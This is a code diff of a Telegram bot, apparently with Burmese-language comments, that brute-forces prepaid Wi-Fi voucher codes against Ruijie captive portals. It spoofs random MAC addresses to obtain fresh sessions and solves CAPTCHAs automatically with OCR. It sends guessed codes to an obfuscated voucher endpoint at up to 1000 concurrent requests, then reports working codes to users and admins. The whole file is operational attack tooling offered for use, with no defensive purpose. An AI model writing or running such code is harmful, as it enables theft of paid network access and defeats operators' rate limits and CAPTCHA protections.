@@ -1,6 +1,6 @@
 import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
 from telebot.async_telebot import AsyncTeleBot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiohttp import web
 import cv2
 import ddddocr
@@ -8,17 +8,19 @@ import numpy as np
 from datetime import datetime, timedelta, timezone
 
 # ==================== CONFIGURATION ====================
+# Railway Variables tab တွင် ထည့်ရမည်
 BOT_TOKEN    = os.environ.get("BOT_TOKEN",    "")
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
 REPO_NAME    = os.environ.get("REPO_NAME",    "")
-WEBHOOK_URL  = os.environ.get("WEBHOOK_URL", "").rstrip("/")
 
+# Admin Telegram IDs — ဤနေရာတွင် တိုက်ရိုက်ထည့်ပါ
 ADMINS = [
     "1626617395",   # Admin 1 ID
     "",   # Admin 2 ID
 ]
 
+# Startup validation
 _missing = [k for k, v in {
     "BOT_TOKEN":    BOT_TOKEN,
     "GITHUB_TOKEN": GITHUB_TOKEN,
@@ -34,36 +36,20 @@ if _missing:
 def is_admin(user_id):
     return str(user_id) in ADMINS
 
-# ==================== PROXY (DISABLED — DIRECT CONNECTION) ====================
-# ✅ Proxy လုံးဝ မသုံးတော့ဘူး — Direct connection
-PAID_PROXIES = []   # ← EMPTY = NO PROXY
+# ───────────────────────────────────────────────────────────
+# PROXY — Direct connection (proxies disabled)
+# ───────────────────────────────────────────────────────────
+PAID_PROXIES = []   # ← empty လုပ်လိုက် (direct connection)
 
-class SimpleProxyRotator:
-    def __init__(self):
-        self.proxies = list(PAID_PROXIES)
-        self.lock    = asyncio.Lock()
+_proxy_index = 0
+def get_next_proxy():
+    global _proxy_index
+    if not PAID_PROXIES:
+        return None          # ← None ဆိုရင် aiohttp direct ချိတ်သွားမယ်
+    proxy = PAID_PROXIES[_proxy_index % len(PAID_PROXIES)]
+    _proxy_index += 1
+    return f"http://{proxy}"
 
-    async def initialize(self):
-        if self.proxies:
-            print(f"[ProxyRotator] ✅ Loaded {len(self.proxies)} proxies")
-        else:
-            print("[ProxyRotator] ⚠️ No proxy — DIRECT CONNECTION mode")
-
-    async def get_proxy_url(self):
-        if not self.proxies:
-            return None   # ← direct connection
-        async with self.lock:
-            return self.proxies[0]
-
-    async def report_proxy_failure(self, proxy_url):
-        pass
-
-    async def close(self):
-        pass
-
-proxy_rotator = SimpleProxyRotator()
-
-# ==================== GLOBALS ====================
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 user_data        = {}
@@ -72,21 +58,31 @@ success_messages = {}
 success_texts    = {}
 limited_messages = {}
 limited_texts    = {}
+captcha_state    = {}
 session          = None
 _connector       = None
-CONCURRENCY      = 100
+CONCURRENCY      = 1000
 _voucher_sem     = None
 _start_time      = time.monotonic()
 
-MAX_CONCURRENT_SCANS = 5
+MAX_CONCURRENT_SCANS = 20
 active_scans_count   = 0
 active_scans_lock    = asyncio.Lock()
 
 # ───────────────────────────────────────────────────────────
-# Web server
+# Web server (keep-alive / Railway PORT)
 # ───────────────────────────────────────────────────────────
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
+
+async def web_server():
+    app    = web.Application()
+    app.router.add_get('/', handle)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
 
 # ───────────────────────────────────────────────────────────
 # GitHub helpers
@@ -176,8 +172,10 @@ def get_scam_button_keyboard():
 async def start(message):
     if message.chat.id not in user_data:
         user_data[message.chat.id] = {}
+
     user_name = message.from_user.first_name or message.from_user.username or "User"
     user_id   = str(message.chat.id)
+
     welcome_text = f"""✨ STAR LINK CODE HACK ✨
 
 👤 NAME: {user_name}
@@ -185,6 +183,7 @@ async def start(message):
 
 🎉 မင်္ဂလာပါ!
 အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
+
     await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())
 
 # ───────────────────────────────────────────────────────────
@@ -196,6 +195,7 @@ async def callback_handler(call):
     user_id   = str(chat_id)
     user_name = call.from_user.first_name or call.from_user.username or "User"
 
+    # ── Back ──────────────────────────────────────────────
     if call.data == "menu_back":
         text = f"""✨ STAR LINK CODE HACK ✨
 
@@ -210,25 +210,24 @@ Menu မှ သင်လိုချင်တာကိုရွေးချယ�
         await bot.answer_callback_query(call.id)
         return
 
+    # ── Portal URL instructions ────────────────────────────
     if call.data == "menu_free_trial":
         text = """🔗 Portal URL ထည့်သွင်းရန်:
 
 /portal [your_portal_url]
 
-✅ လက်ခံတဲ့ Portal အမျိုးအစားများ:
+ဥပမာ:
+/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00
 
-1️⃣ **WiFiDog** (Ruijie router):
-/portal https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=...&mac=...
-
-2️⃣ **Maccauth**:
-/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"""
+Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"""
         await bot.edit_message_text(
             chat_id=chat_id, message_id=call.message.message_id,
-            text=text, reply_markup=get_back_keyboard(), parse_mode="Markdown"
+            text=text, reply_markup=get_back_keyboard()
         )
         await bot.answer_callback_query(call.id)
         return
 
+    # ── Start scan ────────────────────────────────────────
     if call.data == "menu_start_scam":
         global active_scans_count, active_scans_lock
         async with active_scans_lock:
@@ -272,25 +271,23 @@ Menu မှ သင်လိုချင်တာကိုရွေးချယ�
             await bot.answer_callback_query(call.id)
             return
 
-        portal_type = detect_portal_type(user_data[chat_id]['session_url'])
-        type_label  = "🌐 WiFiDog" if portal_type == "wifidog" else "🔐 Maccauth"
-
         await bot.edit_message_text(
             chat_id=chat_id, message_id=call.message.message_id,
-            text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n📡 Portal: {type_label}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
+            text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
             reply_markup=get_scam_button_keyboard(), parse_mode="Markdown"
         )
 
         progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
         scan_id      = str(uuid.uuid4())
 
+        # Notify admins (scan start)
         try:
             portal_url = user_data[chat_id].get('session_url', 'Unknown')
             last_url   = user_data[chat_id].get('last_admin_notified_url', '')
             if portal_url != last_url and portal_url != 'Unknown':
                 msg = (f"🚀 **Scan Start**\n\n👤 **User:** {user_name}\n"
                        f"🆔 **ID:** `{user_id}`\n🔢 **Mode:** {mode}\n"
-                       f"📡 **Type:** {type_label}\n🔗 **Portal:**\n`{portal_url}`")
+                       f"🔗 **Portal:**\n`{portal_url}`")
                 for admin_id in ADMINS:
                     try:
                         await bot.send_message(admin_id, msg, parse_mode="Markdown")
@@ -311,6 +308,7 @@ Menu မှ သင်လိုချင်တာကိုရွေးချယ�
         await bot.answer_callback_query(call.id)
         return
 
+    # ── Results ───────────────────────────────────────────
     if call.data == "menu_result":
         results, _ = await get_file_content("result.json")
         if user_id in results and results[user_id]:
@@ -325,6 +323,7 @@ Menu မှ သင်လိုချင်တာကိုရွေးချယ�
         await bot.answer_callback_query(call.id)
         return
 
+    # ── Recheck ───────────────────────────────────────────
     if call.data == "menu_recheck":
         if 'session_url' not in user_data.get(chat_id, {}):
             await bot.edit_message_text(
@@ -343,13 +342,16 @@ Menu မှ သင်လိုချင်တာကိုရွေးချယ�
         await bot.answer_callback_query(call.id)
         return
 
+    # ── Stop ─────────────────────────────────────────────
     if call.data == "menu_stop":
         await stop_scan_command(call.message)
         await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
         return
 
+    # ── Select voucher mode ───────────────────────────────
     if call.data.startswith("scan_"):
         mode = call.data.replace("scan_", "")
+
         if chat_id not in user_data:
             user_data[chat_id] = {}
 
@@ -373,6 +375,7 @@ Menu မှ သင်လိုချင်တာကိုရွေးချယ�
 
         user_data[chat_id]['selected_mode']  = mode
         user_data[chat_id]['start_digit']    = None
+
         await bot.edit_message_text(
             chat_id=chat_id, message_id=call.message.message_id,
             text=f"🔍 ရွေးချယ်ထားသော VOUCHER: {mode}\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
@@ -381,12 +384,15 @@ Menu မှ သင်လိုချင်တာကိုရွေးချယ�
         await bot.answer_callback_query(call.id)
         return
 
+    # ── Select start digit ────────────────────────────────
     if call.data.startswith("digit_"):
         parts = call.data.split("_")
         mode  = parts[1]
         digit = parts[2]
+
         if chat_id not in user_data:
             user_data[chat_id] = {}
+
         user_data[chat_id]['selected_mode'] = mode
         user_data[chat_id]['start_digit']   = None if digit == "random" else digit
 
@@ -420,22 +426,25 @@ async def handle_result(message):
 @bot.message_handler(commands=['recheck'])
 async def recheck(message):
     chat_id = message.chat.id
+
     results, sha = await get_file_content("result.json")
     uid          = str(chat_id)
+
     if uid not in results or not results[uid]:
         await bot.reply_to(message, "ယခင် success code တစ်ခုမျှမရှိသေးပါ။")
         return
+
     if 'session_url' not in user_data.get(chat_id, {}):
         await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
         return
+
     await bot.reply_to(message, "Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
 
-    recheck_list   = []
-    session_url_rc = user_data[chat_id]["session_url"]
+    recheck_list    = []
+    session_url_rc  = user_data[chat_id]["session_url"]
     for code in results[uid]:
-        code_clean = code.split('\n')[0].replace("🎫", "").strip()
         recode = await perform_check(
-            session_url_rc, code_clean, chat_id,
+            session_url_rc, code, chat_id,
             scan_id=None, recheck=True, message=message
         )
         if recode:
@@ -451,16 +460,6 @@ async def save_rechecked_codes(uid, recheck_list, sha):
     await update_file_content("result.json", results, sha, f"Recheck update for {uid}")
 
 # ───────────────────────────────────────────────────────────
-# Portal type detection
-# ───────────────────────────────────────────────────────────
-def detect_portal_type(url):
-    if '/api/auth/wifidog' in url or 'wifidog' in url.lower():
-        return "wifidog"
-    if 'maccauth' in url:
-        return "maccauth"
-    return "unknown"
-
-# ───────────────────────────────────────────────────────────
 # /portal
 # ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['portal'])
@@ -469,40 +468,73 @@ async def handle_portal(message):
     if len(args) < 2:
         await bot.reply_to(
             message,
-            "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]"
+            "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]\n\n"
+            "ဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/"
+            "maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"
         )
         return
 
-    url = args[1].strip()
+    url = args[1]
     if message.chat.id not in user_data:
         user_data[message.chat.id] = {}
 
-    portal_type = detect_portal_type(url)
-    if portal_type == "unknown":
+    await bot.reply_to(message, "🔗 Portal URL စစ်ဆေးနေပါသည်...")
+
+    if await check_session_url_improved(session_url=url):
+        user_data[message.chat.id]['session_url'] = url
         await bot.reply_to(
             message,
-            "❌ Portal URL မှားယွင်းနေပါသည်။\n\n"
-            "✅ လက်ခံတဲ့ URL ပုံစံများ:\n\n"
-            "**WiFiDog:**\n`https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&...`\n\n"
-            "**Maccauth:**\n`https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?...`",
+            "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
+            reply_markup=get_voucher_keyboard()
+        )
+    else:
+        await bot.reply_to(
+            message,
+            "❌ Portal URL မှားယွင်းနေပါသည်။ ပြန်လည်စစ်ဆေးပါ။\n\n"
+            "✅ မှန်ကန်တဲ့ URL ပုံစံ:\n"
+            "`https://portal-as.ruijienetworks.com/download/static/maccauth/"
+            "src/index.html?lang=en_US&mac=02:00:00:00:00:00`",
             parse_mode="Markdown"
         )
-        return
 
-    user_data[message.chat.id]['session_url'] = url
-    user_data[message.chat.id]['portal_type'] = portal_type
-
-    label = "🌐 WiFiDog Portal" if portal_type == "wifidog" else "🔐 Maccauth Portal"
-    await bot.reply_to(
-        message,
-        f"✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။\n\n"
-        f"📡 Type: {label}\n\n"
-        f"VOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
-        reply_markup=get_voucher_keyboard()
-    )
+async def check_session_url_improved(session_url, use_proxy=False):
+    headers = {
+        'accept':          'text/html,application/xhtml+xml,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.9',
+        'user-agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    }
+    proxy = get_next_proxy() if use_proxy else None
+    try:
+        async with session.get(
+            session_url, allow_redirects=True, headers=headers,
+            proxy=proxy, timeout=15
+        ) as response:
+            if response.status >= 400:
+                return False
+            final_url     = str(response.url)
+            response_text = await response.text()
+            if "sessionId" in final_url or "sessionId" in response_text:
+                return True
+            for indicator in ["portal-as.ruijienetworks.com", "maccauth", "sessionId", "lang=en_US"]:
+                if indicator in final_url or indicator in response_text:
+                    return True
+            for pattern in [
+                r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)',
+                r'[?&]sessionId=([a-zA-Z0-9]+)',
+            ]:
+                if re.search(pattern, response_text, re.IGNORECASE):
+                    return True
+            if "portal" in response_text.lower() or "captcha" in response_text.lower():
+                return True
+            return False
+    except asyncio.TimeoutError:
+        return False
+    except Exception as e:
+        print(f"Portal check error: {e}")
+        return False
 
 # ───────────────────────────────────────────────────────────
-# /scan
+# /scan  (command-based entry)
 # ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['scan'])
 async def handle_key_scan(message):
@@ -555,7 +587,7 @@ async def handle_key_scan(message):
     scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
 
 # ───────────────────────────────────────────────────────────
-# /status
+# /status  (admin only)
 # ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['status'])
 async def status(message):
@@ -571,8 +603,7 @@ async def status(message):
         f"📊 Bot Status\n\n"
         f"⏱ Uptime: {hours}h {minutes}m {secs}s\n"
         f"🔍 Active Scans: {active_scans}\n"
-        f"👥 Sessions: {len(user_data)}\n\n"
-        f"🌐 Connection: DIRECT (no proxy)"
+        f"👥 Sessions: {len(user_data)}"
     )
 
 # ───────────────────────────────────────────────────────────
@@ -601,8 +632,8 @@ async def stop_scan_command(message):
     chat_id = message.chat.id
     data    = scan_tasks.get(chat_id)
     if data and not data["task"].done():
-        data["stop"]    = True
-        data["scan_id"] = None
+        data["stop"]     = True
+        data["scan_id"]  = None
         await send_success_file(chat_id)
         data["task"].cancel()
         success_messages.pop(chat_id, None)
@@ -715,7 +746,7 @@ def format_progress(checked, total=None, speed=0, found=0):
         f"📊Status : running\n"
     )
 
-BATCH_SIZE = 200
+BATCH_SIZE = 1000
 
 # ───────────────────────────────────────────────────────────
 # Brute-force runner
@@ -728,7 +759,8 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
         await bot.send_message(chat_id, str(e))
         return
 
-    total      = (10 ** int(mode)) if mode in ["6", "7", "8"] else None
+    total = (10 ** int(mode)) if mode in ["6", "7", "8"] else None
+
     checked    = 0
     scan_start = time.monotonic()
 
@@ -773,8 +805,13 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
                     chat_id=chat_id, message_id=progress_msg.message_id, text=text
                 )
             except Exception:
-                pass
+                try:
+                    new_msg = await bot.send_message(chat_id, text)
+                    progress_msg.message_id = new_msg.message_id
+                except Exception as err:
+                    print(f"Progress error: {err}")
 
+        # Completed
         found       = len(success_texts.get(chat_id, []))
         finish_text = (
             f"🔍Scanning Completed\n\n"
@@ -788,6 +825,8 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
         except Exception:
             await bot.send_message(chat_id, finish_text)
 
+        await send_success_file(chat_id)
+
     finally:
         await send_success_file(chat_id)
         scan_tasks.pop(chat_id, None)
@@ -800,7 +839,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
             active_scans_count = max(0, active_scans_count - 1)
 
 # ───────────────────────────────────────────────────────────
-# Maccauth helpers
+# Session / Captcha helpers
 # ───────────────────────────────────────────────────────────
 def get_mac():
     fb  = random.choice([0x02, 0x06, 0x0A, 0x0E])
@@ -811,22 +850,18 @@ def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
 async def get_session_id(sess, session_url, previous_session_id=None):
-    mac         = get_mac()
+    mac        = get_mac()
     session_url = replace_mac(session_url, new_mac=mac)
     headers = {
-        'accept':     'text/html,application/xhtml+xml,*/*;q=0.8',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'accept':       'text/html,application/xhtml+xml,*/*;q=0.8',
+        'user-agent':   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'cookie':       ('sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-'
+                         '0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'),
     }
     try:
         async with sess.get(session_url, headers=headers, allow_redirects=True) as req:
             m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
-            if m:
-                return m.group(1)
-            body = await req.text()
-            m2   = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', body)
-            if m2:
-                return m2.group(1)
-            return previous_session_id
+            return m.group(1) if m else previous_session_id
     except Exception:
         return previous_session_id
 
@@ -848,9 +883,9 @@ async def Captcha_Text(image_bytes):
 
 async def Captcha_Image(sess, session_id):
     headers = {
-        'authority':  'portal-as.ruijienetworks.com',
-        'accept':     'image/*,*/*;q=0.8',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+        'authority':    'portal-as.ruijienetworks.com',
+        'accept':       'image/*,*/*;q=0.8',
+        'user-agent':   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
     }
     params = {'sessionId': session_id, '_t': str(time.time())}
     async with sess.get(
@@ -867,32 +902,33 @@ async def Varify_Captcha(sess, session_id, text):
         'origin':       'https://portal-as.ruijienetworks.com',
         'user-agent':   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
     }
-    try:
-        async with sess.post(
-            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
-            headers=headers,
-            json={'sessionId': session_id, 'authCode': text}
-        ) as req:
-            data = await req.json()
-            return session_id if data.get("success") else None
-    except Exception:
-        return None
+    async with sess.post(
+        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
+        headers=headers,
+        json={'sessionId': session_id, 'authCode': text}
+    ) as req:
+        data = await req.json()
+        print(f"[Captcha] authCode={text} success={data.get('success')}")
+        return session_id if data.get("success") else None
 
 # ───────────────────────────────────────────────────────────
-# Maccauth voucher check
+# Core voucher check
 # ───────────────────────────────────────────────────────────
-async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
-                                  recheck=False, message=None):
+async def perform_check(session_url, code, chat_id, scan_id=None,
+                        recheck=False, message=None):
+    if not recheck:
+        cur = scan_tasks.get(chat_id)
+        if not cur or cur.get("scan_id") != scan_id:
+            return
+
     post_url = base64.b64decode(
         b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
     ).decode()
 
-    response   = None
-    session_id = None
+    response = None
 
-    for attempt in range(2):
-        timeout = aiohttp.ClientTimeout(total=25)
-
+    for attempt in range(3):
+        timeout = aiohttp.ClientTimeout(total=30)
         async with aiohttp.ClientSession(
             connector=_connector, connector_owner=False,
             cookie_jar=aiohttp.CookieJar(), timeout=timeout
@@ -902,15 +938,15 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
                 continue
 
             auth_code = None
-            for _ in range(5):
+            for _ in range(8):
                 try:
                     image = await Captcha_Image(ts, session_id)
                     text  = await Captcha_Text(image)
                     if text and await Varify_Captcha(ts, session_id, text):
                         auth_code = text
                         break
-                except Exception:
-                    pass
+                except Exception as e:
+                    print(f"[captcha] {e}")
             if not auth_code:
                 continue
 
@@ -934,7 +970,9 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
                     }
                 ) as req:
                     response = await req.text()
-            except Exception:
+                    print(f"[voucher] code={code} attempt={attempt+1} resp={response[:60]}")
+            except Exception as e:
+                print(f"[perform_check] {e}")
                 return
 
         if response and 'request limited' in response:
@@ -945,6 +983,7 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
     if not response:
         return
 
+    # ── SUCCESS ──────────────────────────────────────────
     if 'logonUrl' in response:
         if recheck:
             return code
@@ -952,6 +991,7 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
         expire_date, _ = await Code_Expires_Date(session_id)
 
         success_texts.setdefault(chat_id, []).append(f"🎫 {code}\n   {expire_date}")
+
         current = user_data.setdefault(chat_id, {}).get('current_display_codes', [])
         current.append(f"🎫 {code}\n   {expire_date}")
         code_line = "\n\n".join(current)
@@ -964,7 +1004,7 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
                     sent = await bot.send_message(
                         message.chat.id, f"Success Codes:\n\n🎫 {code}\n   {expire_date}"
                     )
-                    success_messages[chat_id]                   = sent.message_id
+                    success_messages[chat_id]              = sent.message_id
                     user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
                 else:
                     try:
@@ -975,10 +1015,15 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
                         )
                         user_data[chat_id]['current_display_codes'] = current
                     except Exception:
-                        pass
-            except Exception:
-                pass
+                        sent = await bot.send_message(
+                            message.chat.id, f"Success Codes:\n\n🎫 {code}\n   {expire_date}"
+                        )
+                        success_messages[chat_id]              = sent.message_id
+                        user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
+            except Exception as e:
+                print(f"Success message error: {e}")
 
+    # ── LIMITED ──────────────────────────────────────────
     elif 'STA' in response:
         limited_texts.setdefault(chat_id, []).append(code)
         limited_line = "\n".join(limited_texts[chat_id])
@@ -995,167 +1040,10 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None,
                             text=f"Limited Codes:\n\n{limited_line}"
                         )
                     except Exception:
-                        pass
-            except Exception:
-                pass
-
-# ───────────────────────────────────────────────────────────
-# WiFiDog voucher check — SILENT VERSION
-# ───────────────────────────────────────────────────────────
-async def perform_check_wifidog(session_url, code, chat_id, scan_id=None,
-                                 recheck=False, message=None):
-    """WiFiDog portal — silent, no log spam"""
-
-    def _p(name, default=""):
-        m = re.search(rf'[?&]{name}=([^&]+)', session_url)
-        return m.group(1) if m else default
-
-    gw_id   = _p("gw_id")
-    gw_sn   = _p("gw_sn")
-    gw_addr = _p("gw_address")
-    gw_port = _p("gw_port", "2060")
-    ip      = _p("ip", "0.0.0.0")
-    mac     = _p("mac")
-    nasip   = _p("nasip")
-    ssid    = _p("ssid", "")
-
-    if not gw_id or not mac:
-        return
-
-    endpoint = "https://portal-as.ruijienetworks.com/api/auth/wifidog/auth"
-
-    headers = {
-        "authority":  "portal-as.ruijienetworks.com",
-        "accept":     "*/*",
-        "origin":     "https://portal-as.ruijienetworks.com",
-        "referer":    session_url,
-        "user-agent": ("Mozilla/5.0 (Linux; Android 12; K) "
-                       "AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36"),
-    }
-
-    params = {
-        "stage":      "validate",
-        "gw_id":      gw_id,
-        "gw_sn":      gw_sn,
-        "gw_address": gw_addr,
-        "gw_port":    gw_port,
-        "ip":         ip,
-        "mac":        mac,
-        "nasip":      nasip,
-        "ssid":       ssid,
-        "token":      code,
-        "auth_code":  code,
-    }
-
-    response  = None
-    status    = 0
-
-    try:
-        async with aiohttp.ClientSession(
-            connector=_connector, connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=aiohttp.ClientTimeout(total=15)
-        ) as ts:
-            async with ts.get(
-                endpoint, params=params, headers=headers,
-                allow_redirects=False
-            ) as req:
-                status   = req.status
-                response = await req.text()
-    except Exception:
-        # silent fail
-        return
-
-    # Error responses — silent
-    if status >= 400:
-        return
-
-    if not response:
-        return
-
-    if not _wifidog_is_success(response, status):
-        return
-
-    # ── SUCCESS ──
-    if recheck:
-        return code
-
-    expire_date = "📋 Plan: WiFiDog | ⏳ Time: Unknown"
-    success_texts.setdefault(chat_id, []).append(f"🎫 {code}\n   {expire_date}")
-
-    current = user_data.setdefault(chat_id, {}).get('current_display_codes', [])
-    current.append(f"🎫 {code}\n   {expire_date}")
-    code_line = "\n\n".join(current)
-
-    await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
-
-    if message:
-        try:
-            if chat_id not in success_messages or len(code_line) > 4000:
-                sent = await bot.send_message(
-                    message.chat.id, f"Success Codes:\n\n🎫 {code}\n   {expire_date}"
-                )
-                success_messages[chat_id]                   = sent.message_id
-                user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
-            else:
-                try:
-                    await bot.edit_message_text(
-                        chat_id=message.chat.id,
-                        message_id=success_messages[chat_id],
-                        text=f"Success Codes:\n\n{code_line}"
-                    )
-                    user_data[chat_id]['current_display_codes'] = current
-                except Exception:
-                    pass
-        except Exception:
-            pass
-
-
-def _wifidog_is_success(response_text, status_code):
-    if not response_text:
-        return False
-    txt = response_text.strip()
-    success_markers = [
-        "Auth: 1", "auth: 1", "auth:1", "Auth:1",
-        '"success":true', '"success": true',
-        "logonUrl", "login success", "authorized",
-    ]
-    for marker in success_markers:
-        if marker.lower() in txt.lower():
-            return True
-    fail_markers = [
-        "Auth: 0", "auth:0", "invalid", "not found",
-        "expired", "limit", "STA", "error",
-    ]
-    for marker in fail_markers:
-        if marker.lower() in txt.lower():
-            return False
-    if status_code in (301, 302, 303, 307, 308):
-        return True
-    return False
-
-# ───────────────────────────────────────────────────────────
-# Unified perform_check — auto-detect
-# ───────────────────────────────────────────────────────────
-async def perform_check(session_url, code, chat_id, scan_id=None,
-                        recheck=False, message=None):
-    if not recheck:
-        cur = scan_tasks.get(chat_id)
-        if not cur or cur.get("scan_id") != scan_id:
-            return
-
-    portal_type = user_data.get(chat_id, {}).get('portal_type') or detect_portal_type(session_url)
-
-    if portal_type == "wifidog":
-        return await perform_check_wifidog(
-            session_url, code, chat_id,
-            scan_id=scan_id, recheck=recheck, message=message
-        )
-    else:
-        return await perform_check_maccauth(
-            session_url, code, chat_id,
-            scan_id=scan_id, recheck=recheck, message=message
-        )
+                        sent = await bot.send_message(message.chat.id, f"Limited Codes:\n\n{limited_line}")
+                        limited_messages[chat_id] = sent.message_id
+            except Exception as e:
+                print(f"Limited message error: {e}")
 
 # ───────────────────────────────────────────────────────────
 # Balance / expiry helpers
@@ -1200,98 +1088,44 @@ async def Code_Expires_Date(active_id):
                     if req.status == 200:
                         respond = await req.json()
                         if respond.get('success'):
-                            result    = respond.get('result', {})
-                            raw_mins  = result.get('totalMinutes') or result.get('remainingMinutes') or 'Unknown'
-                            profile   = result.get('profileName', 'Unknown')
-                            totaltime = Minute_to_Hour(raw_mins)
+                            result     = respond.get('result', {})
+                            raw_mins   = result.get('totalMinutes') or result.get('remainingMinutes') or 'Unknown'
+                            profile    = result.get('profileName', 'Unknown')
+                            totaltime  = Minute_to_Hour(raw_mins)
                             return f"📋 Plan: {profile} | ⏳ Time: {totaltime}", raw_mins
-            except Exception:
-                pass
+            except Exception as e:
+                print(f"[Code_Expires_Date] {e}")
     return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'
 
 # ───────────────────────────────────────────────────────────
-# Polling
+# Polling  (timeout fix — request_timeout > timeout)
 # ───────────────────────────────────────────────────────────
 async def start_polling():
     backoff = 5
     while True:
         try:
             await bot.infinity_polling(
-                timeout=45,
-                request_timeout=55,
+                timeout=45,          # long-poll wait (Telegram holds connection)
+                request_timeout=55,  # aiohttp timeout — MUST be > timeout
                 interval=0,
             )
             return
-        except telebot.apihelper.ApiTelegramException as e:
-            if e.error_code == 409:
-                print(f"⚠️ 409 Conflict — waiting {backoff}s...")
-                await asyncio.sleep(backoff)
-                backoff = min(backoff * 2, 120)
-                continue
-            print(f"Telegram API error: {e}. Retry in {backoff}s...")
-            await asyncio.sleep(backoff)
-            backoff = min(backoff * 2, 60)
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-            print(f"Polling connection error: {e}. Retry in {backoff}s...")
+            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
         except Exception as e:
-            print(f"Polling error: {e}. Retry in {backoff}s...")
+            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
-
-# ───────────────────────────────────────────────────────────
-# Webhook mode
-# ───────────────────────────────────────────────────────────
-async def run_webhook_mode():
-    app = web.Application()
